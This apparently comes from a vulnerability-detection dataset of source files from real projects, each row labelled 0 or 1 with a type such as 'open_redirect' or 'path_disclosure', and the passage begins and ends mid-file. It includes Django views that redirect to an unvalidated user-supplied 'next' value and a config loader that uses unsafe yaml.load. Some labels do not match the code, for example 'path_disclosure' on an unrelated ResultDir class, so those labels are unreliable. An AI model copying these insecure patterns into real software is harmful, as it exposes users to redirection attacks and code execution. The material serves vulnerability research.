        form = TransactionPayForm(request.POST, instance=transaction)
        valid = form.is_valid()

        # If cancel has been set, delete and go home
        # Note that value is still string before validating
        if form.data['cancel_button'] == 'True':
            transaction.delete()
            return redirect('index')

        # If valid
        if valid:

            # Close the transaction
            if form.cleaned_data['confirm_button']:
                transaction.closed = True
                transaction.closed_date = timezone.datetime.now()
                transaction.save()
                return redirect('transaction_detail', transaction_code=transaction.code)

            # Save the transaction
            if form.cleaned_data['save_button']:
                transaction.save()
                return redirect('transaction_detail', transaction_code=transaction.code)

        else:
            extra_context['form'] = form
            return render(request, 'transactions/transaction_pay.html', extra_context)

    # GET
    else:

        # Create the form
        form = TransactionPayForm(instance=transaction)
        extra_context['form'] = form
        return render(request, 'transactions/transaction_pay.html', extra_context)


def transactions_open(request, *args, **kwargs):

    # Check permissions
    if not request.user.is_authenticated:
        return invalid_permission_redirect(request)

    # Set initial filter data
    filter_data = {
        'closed': False,
    }
    params = urllib.parse.urlencode(filter_data)
    # Return
    response = redirect('transaction_list')
    response['Location'] += '?{}'.format(params)
    return response
/n/n/n",0,open_redirect
25,113,3836e2f5eae0391c89c5b4d0759604c9264630db,"/django_container/app/clickgestion/transactions/views.py/n/nfrom django.apps import apps
from clickgestion.transactions.forms import TransactionEditForm, TransactionPayForm
from clickgestion.transactions.models import BaseConcept, Transaction
from django.shortcuts import get_object_or_404, render, redirect, reverse
from django.utils.translation import gettext, gettext_lazy
from clickgestion.transactions.filters import ConceptFilter, TransactionFilter
from clickgestion.core.utilities import invalid_permission_redirect
from django.views.generic import ListView
from django.contrib.auth.decorators import login_required
from pure_pagination.mixins import PaginationMixin
from django.http import HttpResponse, QueryDict
from django.conf import settings
from django.utils import timezone
from django_xhtml2pdf.utils import generate_pdf


@login_required()
def concept_delete(request, *args, **kwargs):
    extra_context = {}

    # Check permissions

    # Get the concept and form
    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)
    extra_context['concept'] = concept

    # Get the transaction
    transaction = concept.transaction
    if transaction.closed:
        return redirect('message', message=gettext('Transaction Closed'))
    extra_context['transaction'] = transaction

    # Use default delete view
    extra_context['header'] = gettext('Delete {}?'.format(concept.concept_type))
    extra_context['message'] = concept.description_short
    extra_context['next'] = request.META['HTTP_REFERER']

    # POST
    if request.method == 'POST':
        default_next = reverse('transaction_detail', kwargs={'transaction_code': concept.transaction.code})
        concept.delete()
        next_page = request.POST.get('next', default_next)
        return redirect(next_page)

    # GET
    else:
        return render(request, 'core/delete.html', extra_context)


@login_required()
def concept_detail(request, *args, **kwargs):
    extra_context = {}

    # Check permissions

    # Get the concept and form
    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)
    extra_context['concept'] = concept

    # Get the transaction
    transaction = concept.transaction
    extra_context['transaction'] = transaction

    return render(request, 'transactions/concept_detail.html', extra_context)


@login_required()
def concept_edit(request, *args, **kwargs):
    extra_context = {}

    # Check permissions

    # Get the concept and form
    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)
    extra_context['concept'] = concept

    # Get the transaction
    transaction = concept.transaction
    if transaction.closed:
        return redirect('message', message=gettext('Transaction Closed'))
    extra_context['transaction'] = transaction

    # POST
    if request.method == 'POST':
        form = concept_form(request.POST, instance=concept)
        if form.is_valid():
            form.save()
            return redirect('transaction_edit', transaction_code=transaction.code)

        else:
            extra_context['form'] = form
            return render(request, 'transactions/concept_edit.html', extra_context)

    # GET
    else:

        # Get the form
        form = concept_form(instance=concept)
        extra_context['form'] = form
        return render(request, 'transactions/concept_edit.html', extra_context)


class ConceptList(PaginationMixin, ListView):

    template_name = 'transactions/concept_list.html'
    model = BaseConcept
    context_object_name = 'concepts'
    paginate_by = 8
    # ListView.as_view will pass custom arguments here
    queryset = None
    header = gettext_lazy('Concepts')
    request = None
    filter = None
    filter_data = None
    is_filtered = False

    def get(self, request, *args, **kwargs):
        # First

        # Check permissions
        if not request.user.is_authenticated:
            return invalid_permission_redirect(request)

        # Get arguments
        self.request = request
        self.filter_data = kwargs.pop('filter_data', {})

        # Call super
        return super().get(self, request, *args, **kwargs)

    def get_context_data(self, **kwargs):
        # Third

        # Call the base implementation first
        context = super().get_context_data(**kwargs)

        # Add data
        context['header'] = self.header
        context['filter'] = self.filter
        context['is_filtered'] = self.is_filtered

        return context

    def get_queryset(self):
        # Second

        # Create filter querydict
        data = QueryDict('', mutable=True)
        # Add filters passed from view
        data.update(self.filter_data)
        # Add filters selected by user
        data.update(self.request.GET)

        # Record as filtered
        self.is_filtered = False
        if len([k for k in data.keys() if k != 'page']) > 0:
            self.is_filtered = True

        # Add filters by permission

        # Filter the queryset
        self.filter = ConceptFilter(data)
        self.queryset = self.filter.qs.select_related('transaction') \
            .prefetch_related('value__currency') \
            .order_by('-id') # 79q 27ms

        # Return
        return self.queryset


def get_available_concepts(employee, transaction):
    """"""
    Get a list of the available concepts that can be added to the given transaction.

    :param employee: The employee executing the transaction (current user)
    :param transaction: The open transaction
    :return: A list of dictionaries.
    """"""

    # get permissions according to transaction
    concepts_permitted_by_transaction = transaction.get_all_permissions()

    # get permissions according to employee
    concepts_permitted_by_employee = employee.get_all_permissions()

    # create the list of permitted concepts
    available_concepts = []
    for concept in settings.CONCEPTS:
        permission = concept.replace('.','.add_')
        concept_model = apps.get_model(concept)

        # Skip this concept if not permitted by the user
        if not permission in concepts_permitted_by_employee:
            continue

        # set default values
        disabled = False
        url = concept_model._url.format('new/{}'.format(transaction.code))

        # disable this concept if not permitted by the transaction
        if not permission in concepts_permitted_by_transaction:
            disabled = True
            url = '#'

        # add to the list
        available_concepts.append(
            {
                'name': concept_model._meta.verbose_name,
                'url': url,
                'disabled': disabled,
            }
        )

    return available_concepts


def get_transaction_from_kwargs(**kwargs):
    # Get the transaction
    transaction_code = kwargs.get('transaction_code', None)
    transaction = get_object_or_404(Transaction, code=transaction_code)
    return transaction


def get_concept_and_form_from_kwargs(**kwargs):

    # Get the form
    concept_form = kwargs.get('concept_form', None)

    # Get the concept class
    concept_class = concept_form._meta.model

    # If a transaction code is provided, this is a new concept
    transaction_code = kwargs.get('transaction_code', None)
    if transaction_code:
        transaction = get_transaction_from_kwargs(**kwargs)
        return concept_class(transaction=transaction), concept_form

    # Get the existing concept
    concept_code = kwargs.get('concept_code', None)
    concept = get_object_or_404(concept_class, code=concept_code)
    return concept, concept_form


def transaction_delete(request, *args, **kwargs):
    extra_context = {}

    # Check permissions
    if not request.user.is_authenticated:
        return invalid_permission_redirect(request)

    # Get the object
    transaction_code = kwargs.get('transaction_code', None)
    transaction = get_object_or_404(Transaction, code=transaction_code)
    extra_context['transaction'] = transaction

    # Use default delete view
    extra_context['header'] = gettext('Delete Transaction?')
    extra_context['message'] = transaction.description_short
    extra_context['next'] = request.META['HTTP_REFERER']

    # POST
    if request.method == 'POST':
        default_next = reverse('transactions_open')
        transaction.delete()
        next_page = request.POST.get('next', default_next)
        return redirect(next_page)

    # GET
    else:
        return render(request, 'core/delete.html', extra_context)


@login_required
def transaction_detail(request, *args, **kwargs):
    extra_context = {}

    # Check permissions
    if not request.user.is_authenticated:
        return invalid_permission_redirect(request)

    # Get the transaction
    transaction_code = kwargs.get('transaction_code', None)
    transaction = get_object_or_404(Transaction, code=transaction_code)
    extra_context['transaction'] = transaction
    return render(request, 'transactions/transaction_detail.html', extra_context)


@login_required
def transaction_edit(request, *args, **kwargs):
    extra_context = {}

    # Check permissions
    if not request.user.is_authenticated:
        return invalid_permission_redirect(request)

    # Get the transaction
    transaction_code = kwargs.get('transaction_code', None)
    if not transaction_code:
        transaction = Transaction.objects.create(employee=request.user)
        return redirect('transaction_edit', transaction_code=transaction.code)

    transaction = get_object_or_404(Transaction, code=transaction_code)
    extra_context['transaction'] = transaction

    # Check that the transaction is open
    if transaction.closed:
        return redirect('message', message=gettext('Transaction Closed'))

    # Get available concepts to add
    available_concepts = get_available_concepts(request.user, transaction)
    extra_context['available_concepts'] = available_concepts

    # POST
    if request.method == 'POST':
        form = TransactionEditForm(request.POST, instance=transaction)
        valid = form.is_valid()

        # Delete and go home
        # Note that the form.data value is still a string before validating
        if form.data['cancel_button'] == 'True':
            transaction.delete()
            return redirect('index')

        # If valid
        if valid:

            # Save the transaction
            transaction.save()

            # Finish later
            if form.cleaned_data['save_button']:
                return redirect('transaction_detail', transaction_code=transaction.code)

            # Proceed to pay
            return redirect('transaction_pay', transaction_code=transaction.code)

        else:
            extra_context['form'] = form
            return render(request, 'transactions/transaction_edit.html', extra_context)

    # GET
    else:

        # Create the form
        form = TransactionEditForm(instance=transaction)
        extra_context['form'] = form
        return render(request, 'transactions/transaction_edit.html', extra_context)


class TransactionList(PaginationMixin, ListView):

    model = Transaction
    context_object_name = 'transactions'
    paginate_by = 8
    # ListView.as_view will pass custom arguments here
    queryset = None
    header = gettext_lazy('Transactions')
    request = None
    filter = None
    filter_data = None
    is_filtered = False

    def get(self, request, *args, **kwargs):
        # First

        # Check permissions
        if not request.user.is_authenticated:
            return invalid_permission_redirect(request)

        # Get arguments
        self.request = request
        self.filter_data = kwargs.pop('filter_data', {})

        # Call super
        return super().get(self, request, *args, **kwargs)

    def get_context_data(self, **kwargs):
        # Third

        # Call the base implementation first
        context = super().get_context_data(**kwargs)

        # Add data
        context['header'] = self.header
        context['filter'] = self.filter
        context['is_filtered'] = self.is_filtered

        return context

    def get_queryset(self):
        # Second

        # Create filter querydict
        data = QueryDict('', mutable=True)
        # Add filters passed from view
        data.update(self.filter_data)
        # Add filters selected by user
        data.update(self.request.GET)

        # Record as filtered
        self.is_filtered = False
        if len([k for k in data.keys() if k != 'page']) > 0:
            self.is_filtered = True

        # Add filters by permission

        # Filter the queryset
        self.filter = TransactionFilter(data)
        self.queryset = self.filter.qs.select_related('cashclose')\
            .prefetch_related('concepts__value__currency') \
            .order_by('-id')  # 79q 27ms

        # Return
        return self.queryset

    def post(self, request, *args, **kwargs):

        # Check permissions
        if not request.user.is_authenticated:
            return invalid_permission_redirect(request)

        print_transaction = request.POST.get('print_transaction', None)
        if print_transaction:
            # Get the transaction
            transaction = get_object_or_404(Transaction, code=print_transaction)
            # Create an http response
            resp = HttpResponse(content_type='application/pdf')
            resp['Content-Disposition'] = 'attachment; filename=""{}.pdf""'.format(transaction.code)
            # Set context
            context = {
                'transaction': transaction,
            }
            # Generate the pdf
            result = generate_pdf('transactions/invoice.html', file_object=resp, context=context)
            return result

        # Return same
        request.method = 'GET'
        return self.get(request, *args, **kwargs)



@login_required
def transaction_pay(request, *args, **kwargs):
    extra_context = {}

    # Check permissions
    if not request.user.is_authenticated:
        return invalid_permission_redirect(request)

    # Get the transaction
    transaction_code = kwargs.get('transaction_code', None)
    transaction = get_object_or_404(Transaction, code=transaction_code)
    extra_context['transaction'] = transaction

    # Check that the transaction is open
    if transaction.closed:
        return redirect('message', message=gettext('Transaction Closed'))

    # Get required payment fields

    # POST
    if request.method == 'POST':
        form = TransactionPayForm(request.POST, instance=transaction)
        valid = form.is_valid()

        # If cancel has been set, delete and go home
        # Note that value is still string before validating
        if form.data['cancel_button'] == 'True':
            transaction.delete()
            return redirect('index')

        # If valid
        if valid:

            # Close the transaction
            if form.cleaned_data['confirm_button']:
                transaction.closed = True
                transaction.closed_date = timezone.datetime.now()
                transaction.save()
                return redirect('transaction_detail', transaction_code=transaction.code)

            # Save the transaction
            if form.cleaned_data['save_button']:
                transaction.save()
                return redirect('transaction_detail', transaction_code=transaction.code)

        else:
            extra_context['form'] = form
            return render(request, 'transactions/transaction_pay.html', extra_context)

    # GET
    else:

        # Create the form
        form = TransactionPayForm(instance=transaction)
        extra_context['form'] = form
        return render(request, 'transactions/transaction_pay.html', extra_context)


def transactions_open(request, *args, **kwargs):

    # Check permissions
    if not request.user.is_authenticated:
        return invalid_permission_redirect(request)

    # Set initial filter data
    filter_data = {
        'closed': False,
    }

    # Return
    listview = TransactionList.as_view()
    return listview(request, filter_data=filter_data)
/n/n/n",1,open_redirect
0,112,6ad16eb9bc401f848c16cb621f5bdd83080cc285,"runner/src/resultdir.py/n/n################################################################################
#                                                                              #
#  output.py                                                                   #
#  preserve files and metrics output by running a job                          #
#                                                                              #                                                                              #
#  $HeadURL$                                                                   #
#  $Id$                                                                        #
#                                                                              #
#  --------------------------------------------------------------------------- #
#  Part of HPCToolkit (hpctoolkit.org)                                         #
#                                                                              #
#  Information about sources of support for research and development of        #
#  HPCToolkit is at 'hpctoolkit.org' and in 'README.Acknowledgments'.          #
#  --------------------------------------------------------------------------- #
#                                                                              #
#  Copyright ((c)) 2002-2017, Rice University                                  #
#  All rights reserved.                                                        #
#                                                                              #
#  Redistribution and use in source and binary forms, with or without          #
#  modification, are permitted provided that the following conditions are      #
#  met:                                                                        #
#                                                                              #
#  * Redistributions of source code must retain the above copyright            #
#    notice, this list of conditions and the following disclaimer.             #
#                                                                              #
#  * Redistributions in binary form must reproduce the above copyright         #
#    notice, this list of conditions and the following disclaimer in the       #
#    documentation and/or other materials provided with the distribution.      #
#                                                                              #
#  * Neither the name of Rice University (RICE) nor the names of its           #
#    contributors may be used to endorse or promote products derived from      #
#    this software without specific prior written permission.                  #
#                                                                              #
#  This software is provided by RICE and contributors ""as is"" and any          #
#  express or implied warranties, including, but not limited to, the           #
#  implied warranties of merchantability and fitness for a particular          #
#  purpose are disclaimed. In no event shall RICE or contributors be           #
#  liable for any direct, indirect, incidental, special, exemplary, or         #
#  consequential damages (including, but not limited to, procurement of        #
#  substitute goods or services; loss of use, data, or profits; or             #
#  business interruption) however caused and on any theory of liability,       #
#  whether in contract, strict liability, or tort (including negligence        #
#  or otherwise) arising in any way out of the use of this software, even      #
#  if advised of the possibility of such damage.                               #
#                                                                              #
################################################################################


from common import options, debugmsg



class ResultDir():
    
    def __init__(self, parentdir, name):

        from collections import OrderedDict
        from os import makedirs
        from os.path import join

        self.name = name
        self.dir = join(parentdir, ""_"" + self.name)
        makedirs(self.dir)
        self.outdict = OrderedDict()
        self.numOutfiles = 0


    def __contains__(self, key):
        
        return key in self.outdict
        
    
    def getDir(self):

        return self.dir
        
    
    def makePath(self, nameFmt, label=None):

        from os.path import join

        self.numOutfiles += 1
        path = join(self.dir, (""{:02d}-"" + nameFmt).format(self.numOutfiles, label))
        return path


    def add(self, *keysOrValues, **kwargs):
        
        from collections import OrderedDict
        from common import assertmsg, fatalmsg
        
        assertmsg(len(keysOrValues) >= 2, ""Output.add must receive at least 2 arguments"")
        
        # decompose arguments
        keyPath = kwargs.get(""subroot"", []) + list(keysOrValues[:-2])   # last 2 elements of 'keysOrValues' are key & value for final store
        lastKey = keysOrValues[-2]  # used to store 'value', but also included in 'keyPath'
        value   = keysOrValues[-1]

        # perform insertion
        ob = self._findValueForPath(lastKey, *keyPath)
        fmt = kwargs.get(""format"", None)
        ob[lastKey] = value if fmt is None else float(fmt.format(value))


    def get(self, *keyPath):
        
        # assert: can traverse keyPath without needed to add a new collection, so None is ok for keyAfter
        print keyPath
        return self._findValueForPath(None, *keyPath)


    def addSummaryStatus(self, status, msg):
        
        self.add(""summary"", ""status"",     status)
        self.add(""summary"", ""status msg"", msg)
        

    def write(self):

        from os.path import join
        from spackle import writeYamlFile

        writeYamlFile(join(self.dir, ""{}.yaml"".format(self.name)), self.outdict)


    def _isCompatible(self, key, collection):
        
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype, ctype = type(key), type(collection)
        
        if ktype is str:
            return ctype is dict or ctype is OrderedDict
        elif ktype is int:
            return ctype is list
        else:
            fatalmsg(""ResultDir._isCompatible: invalid key type ({})"".format(ktype))
    
    
    def _findValueForPath(self, keyAfter, *keyPath):
    
        ob = self.outdict
        for k, key in enumerate(keyPath):
            if self._isCompatible(key, ob):
                if key not in ob:
                    nextkey = keyPath[k+1] if k+1 < len(keyPath) else keyAfter
                    ob[key] = self._collectionForKey(nextkey)
                ob = ob[key]
            else:
                fatalmsg(""ResultDir: invalid key for current collection in key path"")
        return ob
    
    
    def _collectionForKey(self, key):
    
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype = type(key)
        
        if ktype is str:
            return OrderedDict()
        elif ktype is int:
            return list()
        else:
            fatalmsg(""ResultDir._collectionForKey: invalid key type ({})"".format(ktype))




/n/n/n",0,path_disclosure
1,113,6ad16eb9bc401f848c16cb621f5bdd83080cc285,"/runner/src/resultdir.py/n/n################################################################################
#                                                                              #
#  output.py                                                                   #
#  preserve files and metrics output by running a job                          #
#                                                                              #                                                                              #
#  $HeadURL$                                                                   #
#  $Id$                                                                        #
#                                                                              #
#  --------------------------------------------------------------------------- #
#  Part of HPCToolkit (hpctoolkit.org)                                         #
#                                                                              #
#  Information about sources of support for research and development of        #
#  HPCToolkit is at 'hpctoolkit.org' and in 'README.Acknowledgments'.          #
#  --------------------------------------------------------------------------- #
#                                                                              #
#  Copyright ((c)) 2002-2017, Rice University                                  #
#  All rights reserved.                                                        #
#                                                                              #
#  Redistribution and use in source and binary forms, with or without          #
#  modification, are permitted provided that the following conditions are      #
#  met:                                                                        #
#                                                                              #
#  * Redistributions of source code must retain the above copyright            #
#    notice, this list of conditions and the following disclaimer.             #
#                                                                              #
#  * Redistributions in binary form must reproduce the above copyright         #
#    notice, this list of conditions and the following disclaimer in the       #
#    documentation and/or other materials provided with the distribution.      #
#                                                                              #
#  * Neither the name of Rice University (RICE) nor the names of its           #
#    contributors may be used to endorse or promote products derived from      #
#    this software without specific prior written permission.                  #
#                                                                              #
#  This software is provided by RICE and contributors ""as is"" and any          #
#  express or implied warranties, including, but not limited to, the           #
#  implied warranties of merchantability and fitness for a particular          #
#  purpose are disclaimed. In no event shall RICE or contributors be           #
#  liable for any direct, indirect, incidental, special, exemplary, or         #
#  consequential damages (including, but not limited to, procurement of        #
#  substitute goods or services; loss of use, data, or profits; or             #
#  business interruption) however caused and on any theory of liability,       #
#  whether in contract, strict liability, or tort (including negligence        #
#  or otherwise) arising in any way out of the use of this software, even      #
#  if advised of the possibility of such damage.                               #
#                                                                              #
################################################################################


from common import options, debugmsg



class ResultDir():
    
    def __init__(self, parentdir, name):

        from collections import OrderedDict
        from os import makedirs
        from os.path import join

        self.name = name
        self.dir = join(parentdir, ""_"" + self.name)
        makedirs(self.dir)
        self.outdict = OrderedDict()
        self.numOutfiles = 0


    def __contains__(self, key):
        
        return key in self.outdict
        
    
    def getDir(self):

        return self.dir
        
    
    def makePath(self, nameFmt, label=None):

        from os.path import join

        self.numOutfiles += 1
        path = join(self.dir, (""{:02d}-"" + nameFmt).format(self.numOutfiles, label))
        return path


    def add(self, *keysOrValues, **kwargs):
        
        from collections import OrderedDict
        from common import assertmsg, fatalmsg
        
        assertmsg(len(keysOrValues) >= 2, ""Output.add must receive at least 2 arguments"")
        
        # decompose arguments
        keyPath = kwargs.get(""subroot"", []) + list(keysOrValues[:-1])   # last element of 'keysOrValues' is the value
        lastKey = keysOrValues[-2]  # used to store 'value', but also included in 'keyPath'
        value   = keysOrValues[-1]

        # perform insertion
        ob = self._findValueForPath(*keyPath)
        fmt = kwargs.get(""format"", None)
        ob[lastKey] = value if fmt is None else float(fmt.format(value))


    def get(self, *keyPath):
        
        return self._findValueForPath(keyPath)


    def addSummaryStatus(self, status, msg):
        
        self.add(""summary"", ""status"",     status)
        self.add(""summary"", ""status msg"", msg)
        

    def write(self):

        from os.path import join
        from spackle import writeYamlFile

        writeYamlFile(join(self.dir, ""{}.yaml"".format(self.name)), self.outdict)


    def _isCompatible(self, key, collection):
        
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype, ctype = type(key), type(collection)
        
        if ktype is str:
            return ctype is dict or ctype is OrderedDict
        elif ktype is int:
            return ctype is list
        else:
            fatalmsg(""ResultDir._isCompatible: invalid key type ({})"".format(ktype))
    
    
    def _findValueForPath(self, *keyPath):
    
        ob = self.outdict
        for k, key in enumerate(keyPath[:-1]):    # last key in 'keyPath' is not traversed, but used to store given 'value'
            if self._isCompatible(key, ob):
                if key not in ob:
                    nextkey = keyPath[k+1]
                    ob[key] = self._collectionForKey(nextkey)
                ob = ob[key]
            else:
                fatalmsg(""ResultDir: invalid key for current collection in key path"")
        return ob
    
    
    def _collectionForKey(self, key):
    
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype = type(key)
        
        if ktype is str:
            return OrderedDict()
        elif ktype is int:
            return list()
        else:
            fatalmsg(""ResultDir._collectionForKey: invalid key type ({})"".format(ktype))




/n/n/n",1,path_disclosure
2,154,75f9e819e7e5c2132d29e5236739fae847279b32,"tilequeue/config.py/n/nfrom tilequeue.tile import bounds_buffer
from tilequeue.tile import metatile_zoom_from_size
from yaml import load
import os


class Configuration(object):
    '''
    Flatten configuration from yaml
    '''

    def __init__(self, yml):
        self.yml = yml

        self.aws_access_key_id = \
            self._cfg('aws credentials aws_access_key_id') or \
            os.environ.get('AWS_ACCESS_KEY_ID')
        self.aws_secret_access_key = \
            self._cfg('aws credentials aws_secret_access_key') or \
            os.environ.get('AWS_SECRET_ACCESS_KEY')

        self.queue_cfg = self.yml['queue']

        self.store_type = self._cfg('store type')
        self.s3_bucket = self._cfg('store name')
        self.s3_reduced_redundancy = self._cfg('store reduced-redundancy')
        self.s3_path = self._cfg('store path')
        self.s3_date_prefix = self._cfg('store date-prefix')
        self.s3_delete_retry_interval = \
            self._cfg('store delete-retry-interval')

        seed_cfg = self.yml['tiles']['seed']
        self.seed_all_zoom_start = seed_cfg['all']['zoom-start']
        self.seed_all_zoom_until = seed_cfg['all']['zoom-until']
        self.seed_n_threads = seed_cfg['n-threads']

        seed_metro_cfg = seed_cfg['metro-extract']
        self.seed_metro_extract_url = seed_metro_cfg['url']
        self.seed_metro_extract_zoom_start = seed_metro_cfg['zoom-start']
        self.seed_metro_extract_zoom_until = seed_metro_cfg['zoom-until']
        self.seed_metro_extract_cities = seed_metro_cfg['cities']

        seed_top_tiles_cfg = seed_cfg['top-tiles']
        self.seed_top_tiles_url = seed_top_tiles_cfg['url']
        self.seed_top_tiles_zoom_start = seed_top_tiles_cfg['zoom-start']
        self.seed_top_tiles_zoom_until = seed_top_tiles_cfg['zoom-until']

        toi_store_cfg = self.yml['toi-store']
        self.toi_store_type = toi_store_cfg['type']
        if self.toi_store_type == 's3':
            self.toi_store_s3_bucket = toi_store_cfg['s3']['bucket']
            self.toi_store_s3_key = toi_store_cfg['s3']['key']
        elif self.toi_store_type == 'file':
            self.toi_store_file_name = toi_store_cfg['file']['name']

        self.seed_should_add_to_tiles_of_interest = \
            seed_cfg['should-add-to-tiles-of-interest']

        seed_custom = seed_cfg['custom']
        self.seed_custom_zoom_start = seed_custom['zoom-start']
        self.seed_custom_zoom_until = seed_custom['zoom-until']
        self.seed_custom_bboxes = seed_custom['bboxes']
        if self.seed_custom_bboxes:
            for bbox in self.seed_custom_bboxes:
                assert len(bbox) == 4, (
                    'Seed config: custom bbox {} does not have exactly '
                    'four elements!').format(bbox)
                min_x, min_y, max_x, max_y = bbox
                assert min_x < max_x, \
                    'Invalid bbox. {} not less than {}'.format(min_x, max_x)
                assert min_y < max_y, \
                    'Invalid bbox. {} not less than {}'.format(min_y, max_y)

        self.seed_unique = seed_cfg['unique']

        intersect_cfg = self.yml['tiles']['intersect']
        self.intersect_expired_tiles_location = (
            intersect_cfg['expired-location'])
        self.intersect_zoom_until = intersect_cfg['parent-zoom-until']

        self.logconfig = self._cfg('logging config')
        self.redis_type = self._cfg('redis type')
        self.redis_host = self._cfg('redis host')
        self.redis_port = self._cfg('redis port')
        self.redis_db = self._cfg('redis db')
        self.redis_cache_set_key = self._cfg('redis cache-set-key')

        self.statsd_host = None
        if self.yml.get('statsd'):
            self.statsd_host = self._cfg('statsd host')
            self.statsd_port = self._cfg('statsd port')
            self.statsd_prefix = self._cfg('statsd prefix')

        process_cfg = self.yml['process']
        self.n_simultaneous_query_sets = \
            process_cfg['n-simultaneous-query-sets']
        self.n_simultaneous_s3_storage = \
            process_cfg['n-simultaneous-s3-storage']
        self.log_queue_sizes = process_cfg['log-queue-sizes']
        self.log_queue_sizes_interval_seconds = \
            process_cfg['log-queue-sizes-interval-seconds']
        self.query_cfg = process_cfg['query-config']
        self.template_path = process_cfg['template-path']
        self.reload_templates = process_cfg['reload-templates']
        self.output_formats = process_cfg['formats']
        self.buffer_cfg = process_cfg['buffer']
        self.process_yaml_cfg = process_cfg['yaml']

        self.postgresql_conn_info = self.yml['postgresql']
        dbnames = self.postgresql_conn_info.get('dbnames')
        assert dbnames is not None, 'Missing postgresql dbnames'
        assert isinstance(dbnames, (tuple, list)), \
            ""Expecting postgresql 'dbnames' to be a list""
        assert len(dbnames) > 0, 'No postgresql dbnames configured'

        self.wof = self.yml.get('wof')

        self.metatile_size = self._cfg('metatile size')
        self.metatile_zoom = metatile_zoom_from_size(self.metatile_size)
        self.metatile_start_zoom = self._cfg('metatile start-zoom')

        self.max_zoom_with_changes = self._cfg('tiles max-zoom-with-changes')
        assert self.max_zoom_with_changes > self.metatile_zoom
        self.max_zoom = self.max_zoom_with_changes - self.metatile_zoom

        self.sql_queue_buffer_size = self._cfg('queue_buffer_size sql')
        self.proc_queue_buffer_size = self._cfg('queue_buffer_size proc')
        self.s3_queue_buffer_size = self._cfg('queue_buffer_size s3')

        self.tile_traffic_log_path = self._cfg(
            'toi-prune tile-traffic-log-path')

        self.group_by_zoom = self.subtree('rawr group-zoom')

    def _cfg(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval[subkey]
        return yamlval

    def subtree(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval.get(subkey)
            if yamlval is None:
                break
        return yamlval


def default_yml_config():
    return {
        'queue': {
            'name': None,
            'type': 'sqs',
            'timeout-seconds': 20
        },
        'store': {
            'type': 's3',
            'name': None,
            'path': 'osm',
            'reduced-redundancy': False,
            'date-prefix': '',
            'delete-retry-interval': 60,
        },
        'aws': {
            'credentials': {
                'aws_access_key_id': None,
                'aws_secret_access_key': None,
            }
        },
        'tiles': {
            'seed': {
                'all': {
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'metro-extract': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                    'cities': None
                },
                'top-tiles': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'custom': {
                    'zoom-start': None,
                    'zoom-until': None,
                    'bboxes': []
                },
                'should-add-to-tiles-of-interest': True,
                'n-threads': 50,
                'unique': True,
            },
            'intersect': {
                'expired-location': None,
                'parent-zoom-until': None,
            },
            'max-zoom-with-changes': 16,
        },
        'toi-store': {
            'type': None,
        },
        'toi-prune': {
            'tile-traffic-log-path': '/tmp/tile-traffic.log',
        },
        'process': {
            'n-simultaneous-query-sets': 0,
            'n-simultaneous-s3-storage': 0,
            'log-queue-sizes': True,
            'log-queue-sizes-interval-seconds': 10,
            'query-config': None,
            'template-path': None,
            'reload-templates': False,
            'formats': ['json'],
            'buffer': {},
            'yaml': {
                'type': None,
                'parse': {
                    'path': '',
                },
                'callable': {
                    'dotted-name': '',
                },
            },
        },
        'logging': {
            'config': None
        },
        'redis': {
            'host': 'localhost',
            'port': 6379,
            'db': 0,
            'cache-set-key': 'tilequeue.tiles-of-interest',
            'type': 'redis_client',
        },
        'postgresql': {
            'host': 'localhost',
            'port': 5432,
            'dbnames': ('osm',),
            'user': 'osm',
            'password': None,
        },
        'metatile': {
            'size': None,
            'start-zoom': 0,
        },
        'queue_buffer_size': {
            'sql': None,
            'proc': None,
            's3': None,
        },
    }


def merge_cfg(dest, source):
    for k, v in source.items():
        if isinstance(v, dict):
            subdest = dest.setdefault(k, {})
            merge_cfg(subdest, v)
        else:
            dest[k] = v
    return dest


def _override_cfg(container, yamlkeys, value):
    """"""
    Override a hierarchical key in the config, setting it to the value.

    Note that yamlkeys should be a non-empty list of strings.
    """"""

    key = yamlkeys[0]
    rest = yamlkeys[1:]

    if len(rest) == 0:
        # no rest means we found the key to update.
        container[key] = value

    elif key in container:
        # still need to find the leaf in the tree, so recurse.
        _override_cfg(container[key], rest, value)

    else:
        # need to create a sub-tree down to the leaf to insert into.
        subtree = {}
        _override_cfg(subtree, rest, value)
        container[key] = subtree


def _make_yaml_key(s):
    """"""
    Turn an environment variable into a yaml key

    Keys in YAML files are generally lower case and use dashes instead of
    underscores. This isn't a universal rule, though, so we'll have to
    either change the keys to conform to this, or have some way of indicating
    this from the environment.
    """"""

    return s.lower().replace(""_"", ""-"")


def make_config_from_argparse(config_file_handle, default_yml=None):
    if default_yml is None:
        default_yml = default_yml_config()

    # override defaults from config file
    yml_data = load(config_file_handle)
    cfg = merge_cfg(default_yml, yml_data)

    # override config file with values from the environment
    for k in os.environ:
        # keys in the environment have the form TILEQUEUE__FOO__BAR (note the
        # _double_ underscores), which will decode the value as YAML and insert
        # it in cfg['foo']['bar'].
        #
        # TODO: should the prefix TILEQUEUE be configurable?
        if k.startswith('TILEQUEUE__'):
            keys = map(_make_yaml_key, k.split('__')[1:])
            value = load(os.environ[k])
            _override_cfg(cfg, keys, value)

    return Configuration(cfg)


def _bounds_pad_no_buf(bounds, meters_per_pixel_dim):
    return dict(
        point=bounds,
        line=bounds,
        polygon=bounds,
    )


def create_query_bounds_pad_fn(buffer_cfg, layer_name):

    if not buffer_cfg:
        return _bounds_pad_no_buf

    buf_by_type = dict(
        point=0,
        line=0,
        polygon=0,
    )

    for format_ext, format_cfg in buffer_cfg.items():
        format_layer_cfg = format_cfg.get('layer', {}).get(layer_name)
        format_geometry_cfg = format_cfg.get('geometry', {})
        if format_layer_cfg:
            for geometry_type, buffer_size in format_layer_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)
        if format_geometry_cfg:
